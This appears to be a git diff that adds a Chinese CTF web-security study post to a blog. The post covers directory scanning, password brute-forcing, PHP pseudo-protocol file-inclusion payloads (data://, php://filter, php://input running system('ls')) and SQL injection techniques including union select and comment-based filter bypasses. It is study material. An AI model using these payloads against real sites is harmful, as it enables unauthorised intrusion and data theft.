@@ -19,19 +19,17 @@
   <meta name="author" content="cl0ud">
   <meta name="keywords" content="blog,cl0ud,cs">
   
-    <meta name="description" content="This is cl0ud&#39;s blog">
+    <meta name="description" content="更新学到的各种Web知识sourcemap泄露就是网站源码泄露，可以通过阅读网站源码挖到网站的洞 HTTP协议这个模块涉及到的知识就很多了 文件扫描当不能从一个网站的前端得到任何有效信息时，可以尝试用dirsearch这个攻具来扫描网站的文件，也许会得到一些网站的配置文件或者备份文件之类的敏感信息，git泄露正是情况之一 我把dirsearch装在了wsl中，启动方法如下 123source .&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web学习">
 <meta property="og:url" content="https://elvpatic.github.io/2025/06/05/web%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="cl0ud&#39;s blog">
-<meta property="og:description" content="This is cl0ud&#39;s blog">
+<meta property="og:description" content="更新学到的各种Web知识sourcemap泄露就是网站源码泄露，可以通过阅读网站源码挖到网站的洞 HTTP协议这个模块涉及到的知识就很多了 文件扫描当不能从一个网站的前端得到任何有效信息时，可以尝试用dirsearch这个攻具来扫描网站的文件，也许会得到一些网站的配置文件或者备份文件之类的敏感信息，git泄露正是情况之一 我把dirsearch装在了wsl中，启动方法如下 123source .&#x2F;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-04T16:31:13.000Z">
-<meta property="article:modified_time" content="2025-06-04T16:31:13.628Z">
+<meta property="article:modified_time" content="2025-09-24T15:19:29.510Z">
 <meta property="article:author" content="cl0ud">
-<meta property="article:tag" content="blog">
-<meta property="article:tag" content="cl0ud">
-<meta property="article:tag" content="cs">
+<meta property="article:tag" content="ctf-web">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -225,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          7k 字
         
       </span>
     
@@ -236,7 +234,7 @@
         
         
         
-          1 分钟
+          59 分钟
         
       </span>
     
@@ -287,7 +285,315 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="更新学到的各种Web知识"><a href="#更新学到的各种Web知识" class="headerlink" title="更新学到的各种Web知识"></a>更新学到的各种Web知识</h1><h2 id="sourcemap泄露"><a href="#sourcemap泄露" class="headerlink" title="sourcemap泄露"></a>sourcemap泄露</h2><p>就是网站源码泄露，可以通过阅读网站源码挖到网站的洞</p>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>这个模块涉及到的知识就很多了</p>
+<h2 id="文件扫描"><a href="#文件扫描" class="headerlink" title="文件扫描"></a>文件扫描</h2><p>当不能从一个网站的前端得到任何有效信息时，可以尝试用<strong>dirsearch</strong>这个攻具来扫描网站的文件，也许会得到一些网站的配置文件或者备份文件之类的敏感信息，<strong>git泄露</strong>正是情况之一</p>
+<p>我把dirsearch装在了wsl中，启动方法如下</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">source</span> ./venv/bin/activate<br><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> url<br>deactvate<br></code></pre></td></tr></table></figure>
+
+<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>网站需要你输入password的过程，本质上是从本地所在的服务器向网站部署的服务器上发送一个数据包请求，其中password使用<strong>post方式</strong>传参。</p>
+<p>我们只要将代理改为127.0.0.1，就相当于使用本机作为发送数据包的源头利用burpsuit抓包后使用字典爆破即可</p>
+<h2 id="游戏类型"><a href="#游戏类型" class="headerlink" title="游戏类型"></a>游戏类型</h2><p>此类型没有确定的知识体系，所以只把我遇到过的问题写在这里</p>
+<h3 id="成绩保存在后端服务器"><a href="#成绩保存在后端服务器" class="headerlink" title="成绩保存在后端服务器"></a>成绩保存在后端服务器</h3><p>一般都是通关之后即可拿到flag，而通关都是有分数限制的。并且web题都是网页，换句话说都是前端代码，想要保存分数一定得从前端向后端传参，所以只要用burpsuit多抓几次包，然后观察前端使用了什么传参方式（大多数时候都是<strong>POST</strong>，找到规律后就可以了。</p>
+<h3 id="成绩保存在本地"><a href="#成绩保存在本地" class="headerlink" title="成绩保存在本地"></a>成绩保存在本地</h3><p>今天做了一道题，探姬出的，玩到第六关就可以有flag，用bp抓了几次发现都是GET传参，说明游戏不存在后端服务器，因此flag只能保存在本地，查看本地的游戏配置文件，发现了game.js，因为这道题是个游戏，所以猜测是这个文件，在里面搜索，果然搜到了flag</p>
+<p><del>实际上我做这题的时候是真的玩到了第六关</del></p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>学习资源</p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a>    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/smile2333/p/18128048">https://www.cnblogs.com/smile2333/p/18128048</a></p>
+<p>“伪协议”是一种特殊的语法，用于访问不同的资源或执行特定的操作。这些伪协议以 <code>php://</code> 开头，后面跟着特定的指示符或参数，以实现不同的功能。这些伪协议提供了一种方便的方式来处理各种输入输出操作，而不必依赖于实际的文件或网络资源。</p>
+<p>简单的理解就是，<strong>在URL中使用特殊的协议前缀来指示PHP执行特定的代码。</strong></p>
+<p>伪协议通常被用于文件包含的问题中，当有参数可以注入时，大家可以大胆的尝试php伪协议</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//关于文件包含的函数</span><br><span class="hljs-built_in">include</span>()、<span class="hljs-built_in">require</span>()、<span class="hljs-built_in">include_once</span>()、<span class="hljs-built_in">require_once</span>()、<span class="hljs-built_in">highlight_file</span>()<br><span class="hljs-built_in">show_source</span>() 、<span class="hljs-built_in">readfile</span>() 、<span class="hljs-built_in">file_get_contents</span>() 、<span class="hljs-built_in">fopen</span>() 、<span class="hljs-built_in">file</span>()<br></code></pre></td></tr></table></figure>
+
+<p>在处理如上函数时，伪协议往往发挥着重要的作用，伪协议有以下种类</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">// — 访问本地文件系统</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">// — 访问 HTTP(s) 网址</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-comment">// — 访问 FTP(s) URLs</span><br><span class="hljs-symbol">php:</span><span class="hljs-comment">// — 访问各个输入/输出流（I/O streams）</span><br><span class="hljs-symbol">zlib:</span><span class="hljs-comment">// — 压缩流</span><br><span class="hljs-symbol">data:</span><span class="hljs-comment">// — 数据（RFC 2397）</span><br><span class="hljs-symbol">glob:</span><span class="hljs-comment">// — 查找匹配的文件路径模式</span><br><span class="hljs-symbol">phar:</span><span class="hljs-comment">// — PHP 归档</span><br><span class="hljs-symbol">ssh2:</span><span class="hljs-comment">// — Secure Shell 2</span><br><span class="hljs-symbol">rar:</span><span class="hljs-comment">// — RAR</span><br><span class="hljs-symbol">ogg:</span><span class="hljs-comment">// — 音频流</span><br><span class="hljs-symbol">expect:</span><span class="hljs-comment">// — 处理交互式的流</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作<strong>php文件</strong>执行。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这行payload就会执行phpinfo();</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>这个伪协议比较复杂，</p>
+<p>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响<br>file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">//E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="hljs-comment">//绝对路径</span><br><span class="hljs-keyword">file</span>./phpinfo.txt<br><span class="hljs-comment">//相对路径</span><br><span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//127.0.0.1/phpinfo.txt</span><br>网络路径<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=hF3QbB3/qiHPCXAK5EK5dQ==.eyImZ9gxKkTs+9adpXzaOIm+HdKI8LRxep4pxH/4qT4zMEzt0kQ32raC05Yns9+9">http://php.net/manual/zh/wrappers.file.php</a></p>
+<p>比较复杂，所以贴上学习链接</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>使用文件包含函数包含文件时,文件中的代码会被执行,如果想要读取文件源码,可以使用<strong>base64</strong>对文件内容进行编码,编码后的文件内容不会被执行,而是展示在页面中,我们将页面中的内容使用<strong>base64</strong>解码,就可以<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">获取文件</a>的源码了</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据,配合文件包含漏洞可以将<strong>post</strong>请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当<strong>enctype&#x3D;multipart&#x2F;form-data</strong>时,<strong>php:&#x2F;input</strong>将会无效</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=php:<span class="hljs-comment">//input        — GET请求参数中使用php://input协议</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(‘ls’); <span class="hljs-meta">?&gt;</span>      — post请求体中的内容会被当做文件内容执行<br></code></pre></td></tr></table></figure>
+
+<h3 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</h3><p>**zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;**均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</span><br><span class="hljs-keyword">zip</span>:<span class="hljs-comment">//E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="hljs-comment">//压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</span><br><span class="hljs-keyword">compress</span>.bzip2:<span class="hljs-comment">//E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br><span class="hljs-comment">//压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</span><br><span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="http-https"><a href="#http-https" class="headerlink" title="http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</h3><p>常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/phpinfo.txt</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>最经典的漏洞类型之一，学习方法在<a target="_blank" rel="noopener" href="https://hello-ctf.com/%EF%BC%8C%E5%90%8E%E5%8F%B0%E4%BD%BF%E7%94%A8sql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%97%B6%E5%A4%A7%E5%A4%9A%E9%83%BD%E6%98%AF%E4%BB%8E%E5%89%8D%E7%AB%AF%E4%BC%A0%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%8E%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%8B%BC%E6%8E%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%A7%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%BF%99%E7%82%B9%E3%80%82">https://hello-ctf.com/，后台使用sql数据库时大多都是从前端传入数据，与后端代码拼接，然后执行查询，我们可以利用这点。</a></p>
+<p>sql注入的题都是让你通过注入找到flag，而换到实际场景中，你拿到了flag就相当于拿到了用户的敏感信息。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>后台代码</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = (某种闭合方式) <span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
+
+<p>为了我们的学习，我们首先需要了解数据库语法基础</p>
+<h3 id="数据库语法基础"><a href="#数据库语法基础" class="headerlink" title="数据库语法基础"></a>数据库语法基础</h3><p>常用语法：</p>
+<ul>
+<li><code>SELECT</code> 是 SQL 语言中最核心、最常用的命令，用于从数据库中 ** 查询（检索）** 数据</li>
+</ul>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> 列名<span class="hljs-number">1</span>, 列名<span class="hljs-number">2</span>, <span class="hljs-params">...</span> FROM 表名 <span class="hljs-keyword">WHERE</span> 条件<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UNION</code> 用于合并两个或多个 SELECT 语句的结果集</li>
+</ul>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> 列名 <span class="hljs-keyword">FROM</span> 表名<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> 列名_1 <span class="hljs-keyword">FROM</span> 表名_1;<br></code></pre></td></tr></table></figure>
+
+<p>注意：使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
+<ul>
+<li><code>LIMIT</code> 限制返回的记录数量</li>
+</ul>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">#返回表中前number行数据<br><span class="hljs-keyword">SELECT</span> column1, column2, ... <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">LIMIT</span> <span class="hljs-keyword">number</span>;<br>#从offset+1行开始返回row_count行数据<br><span class="hljs-keyword">SELECT</span> column1, column2, ... <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">LIMIT</span> <span class="hljs-keyword">offset</span>, row_count;<br>#比如 LIMIT 10, <span class="hljs-number">10</span> 返回<span class="hljs-number">11</span><span class="hljs-number">-20</span>行数据<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name <span class="hljs-keyword">DESC</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>注释</code></li>
+</ul>
+<p><code>--</code> 这是一个单行注释。注意，<code>--</code> 后必须加一个空格，注释才会生效</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = ((<span class="hljs-number">1</span>)) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<span class="hljs-comment">-- )) limit1,1;后面的内容都将被注释</span><br></code></pre></td></tr></table></figure>
+
+<p><code>#</code> 是另一种单行注释</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">DROP</span> sampletable;<span class="hljs-meta"># 后面的内容都将被注释</span><br></code></pre></td></tr></table></figure>
+
+<p>多行注释使用 <code>/*</code> 和 <code>*/</code> 包裹注释内容，可以跨多行书写</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">DROP</span><span class="hljs-comment">/*comment*/</span>sampletable`   DR<span class="hljs-comment">/**/</span>OP<span class="hljs-comment">/*绕过过滤*/</span>sampletable`    <span class="hljs-keyword">SELECT</span><span class="hljs-comment">/*替换空格*/</span><span class="hljs-keyword">password</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>Members #<span class="hljs-comment">/**/</span>可用于替换空格<br><span class="hljs-comment">/*中间的内容都将被注释*/</span><br>  <span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*!32302 1/0, */</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> tablename #这种 <span class="hljs-comment">/*! 注释仅在MySQL中存在，在其他数据库中会被忽略</span><br></code></pre></td></tr></table></figure>
+
+<p>除此之外<code> --+</code>也是常用的注释符</p>
+<ul>
+<li><code>Order by</code> 对结果集进行排序</li>
+</ul>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> column1, column2, ... <span class="hljs-keyword">FROM</span> table_name [<span class="hljs-keyword">WHERE</span> condition] <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name [<span class="hljs-keyword">ASC</span>|<span class="hljs-keyword">DESC</span>];<br></code></pre></td></tr></table></figure>
+
+<p>其中，column1、column2 等表示要查询的列名，题目中大多数为<strong>1，2，3这种数字</strong>，table_name 表示要查询的表名，condition 表示查询条件，column_name 表示要按照哪一列进行排序，ASC 或 DESC 表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 在<span class="hljs-keyword">SQL</span>注入中我们常用它来判断列数<br><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span> [<span class="hljs-keyword">WHERE</span> condition] <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">1</span>;# 不报错<br><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span> [<span class="hljs-keyword">WHERE</span> condition] <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>;# 不报错<br><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span> [<span class="hljs-keyword">WHERE</span> condition] <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">3</span>;# 报错<br></code></pre></td></tr></table></figure>
+
+<p>还需要用到一些常用参数：</p>
+<ul>
+<li><code>user()</code>：当前数据库用户</li>
+<li><code>database()</code>：当前数据库名</li>
+<li><code>version()</code>：当前使用的数据库版本</li>
+<li><code>@@datadir</code>：数据库存储数据路径</li>
+<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
+<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
+<li><code>concat_ws()</code>：用法类似</li>
+<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
+<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
+</ul>
+<p>至此，基础已经打好了，开始正式学习sql注入</p>
+<p>首先要构造闭合，但是为什么要构造闭合呢？让我们假定这样一条查询语句</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="hljs-variable">$id</span>&#x27;&quot;</span>;</span><br></code></pre></td></tr></table></figure>
+
+<p>当我们输入</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>传入后端查询代码就成为了这样</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>where语句的判断标准是，遍历整张表，找到可以使where后面的语句为真的就行，输出该行的所有字段值（column），而这样的输入会导致，where后的语句永远为真，就可以不考虑id，直接输出所有字段值</p>
+<p>由此可见，构造闭合的目的在于成功构造where后永真的字符串，如果有一种神奇的方法可以不用构造闭合就能达到相同的目的，那大家也可以积极尝试。</p>
+<p>大多数sql注入都是黑盒注入，所以实际上需要<strong>判断闭合类型</strong>（非常重要的一点，所有的sql注入都要以判断闭合类型为基础），那么如何判断闭合呢？</p>
+<p>有几种方法，会随着我的学习进度慢慢附上</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>首先注入<code> 1&#39;</code>,查看回显，如下表格描述，回显语句会在报错的点加上 <strong>‘’</strong> ,所以当我们去掉一个引号之后</p>
+<table>
+<thead>
+<tr>
+<th align="left">后台实际输入</th>
+<th align="left">执行语句</th>
+<th align="left">是否报错 以及 相关解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&quot;1&#39;&quot;</code></td>
+<td align="left"><code>SELECT username,password FROM users WHERE id = &quot;1&#39;&quot;</code></td>
+<td align="left"><code>&quot;&quot;</code> 中为可以包含 <code>&#39;</code> ，而 <code>1&#39;</code> 是一个合法的字符串 , 在查询时会先被强制类型转换为数字，<strong>不会报错</strong></td>
+</tr>
+<tr>
+<td align="left"><code>1&#39;</code></td>
+<td align="left"><code>SELECT username,password FROM users WHERE id = 1&#39;</code></td>
+<td align="left">这里的 <code>&#39;</code> 就没有闭合，<strong>会报错</strong>。</td>
+</tr>
+<tr>
+<td align="left"><code>&#39;1&#39;&#39;</code></td>
+<td align="left"><code>SELECT username,password FROM users WHERE id = &#39;1&#39;&#39;</code></td>
+<td align="left">这里的 <code>&#39;</code>与前序的<code>&#39;</code> 闭合了但这样就留下了后序单着的 <code>&#39;</code>，<strong>会报错</strong>。</td>
+</tr>
+</tbody></table>
+<p>如下表格描述，回显语句会在报错的点加上 <strong>‘’</strong> ,所以当我们去掉一个引号之后，再去掉自己去掉的内容，就是闭合方式</p>
+<table>
+<thead>
+<tr>
+<th align="left">输入</th>
+<th align="left">后台执行</th>
+<th align="left">后台报错</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>1&quot;</code></td>
+<td align="left"><code>id = &quot;1&quot;&quot;</code></td>
+<td align="left"><code>near &#39;&quot;1&quot;&quot;&#39; at line 1</code></td>
+<td align="left">去掉外层 SQL 的单引号，留下<code>&quot;1&quot;&quot;</code>，除去自己的输入 <code>1&quot;</code>可知类型为 <strong>双引号</strong> 的 <strong>字符型注入</strong></td>
+</tr>
+<tr>
+<td align="left"><code>1&#39;</code></td>
+<td align="left"><code>id = &#39;1&#39;&#39;</code></td>
+<td align="left"><code>near &#39;&#39;1&#39;&#39;&#39; at line 1</code></td>
+<td align="left">同理，留下<code>&#39;1&#39;&#39;</code>除去自己的输入 <code>1&#39;</code>可知类型为 <strong>单引号</strong> 的 <strong>字符型注入</strong></td>
+</tr>
+<tr>
+<td align="left"><code>&#39;1</code></td>
+<td align="left"><code>id = &#39;&#39;1&#39;</code></td>
+<td align="left"><code>near &#39;1&#39;&#39; at line 1</code></td>
+<td align="left">对于后台 SQL，由于 <code>id = &#39;&#39;</code>已经合法闭合，所以后面 <code>1&#39;</code>反而为多出的语句，所以报错点在 <code>1&#39;</code></td>
+</tr>
+</tbody></table>
+<p>确定闭合方式之后，构造payload</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">-<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> ...(数字，判断正在搜索的表有几列)<br></code></pre></td></tr></table></figure>
+
+<p>数字部分从1开始尝试，直到报错，就是报错的列数-1</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">-1&#x27; union select 1,2,3  --+<br>//select查询1，2，3语句含义是在现有的列上，从左向右以此标记数字，举例<br>一个表有id，user，pass三列，就是<br>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<br>|<span class="hljs-string">id   </span>|<span class="hljs-string">user </span>|<span class="hljs-string">pass </span>|<br>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<br>|<span class="hljs-string">1    </span>|<span class="hljs-string">2    </span>|<span class="hljs-string">3    </span>|<br>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<span class="hljs-string">-----</span>|<br></code></pre></td></tr></table></figure>
+
